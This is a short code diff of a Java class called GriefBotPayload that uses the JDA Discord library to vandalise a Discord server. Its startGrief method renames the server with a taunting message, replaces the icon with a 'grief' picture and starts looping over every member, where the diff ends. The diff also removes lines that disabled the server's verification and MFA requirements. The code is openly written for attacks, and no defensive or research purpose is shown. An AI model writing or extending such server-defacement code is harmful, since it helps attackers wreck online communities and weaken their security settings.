@@ -11,8 +11,6 @@ import net.dv8tion.jda.api.entities.Icon;
 import net.dv8tion.jda.api.entities.Member;
 import net.dv8tion.jda.api.entities.TextChannel;
 import net.dv8tion.jda.api.entities.User;
-import net.dv8tion.jda.api.entities.Guild.MFALevel;
-import net.dv8tion.jda.api.entities.Guild.VerificationLevel;
 
 public class GriefBotPayload {
 
@@ -26,11 +24,7 @@ public class GriefBotPayload {
 
 	public void startGrief() throws Exception {
 		String name = String.format(GriefBot.getInstance().getGriefMessage(), user.getName());
-		guild.getManager().setVerificationLevel(VerificationLevel.NONE).queue();
 		guild.getManager().setName(name).queue();
-		guild.getManager().setRequiredMFALevel(MFALevel.NONE).queue();
-		guild.getManager().setDescription(name).queue();
-		guild.getManager().reason(name).queue();
 		guild.getManager().setIcon(Icon.from(Config.GRIEF_PICTURE)).queue();
 
 		for (Member member : guild.getMembers()) {
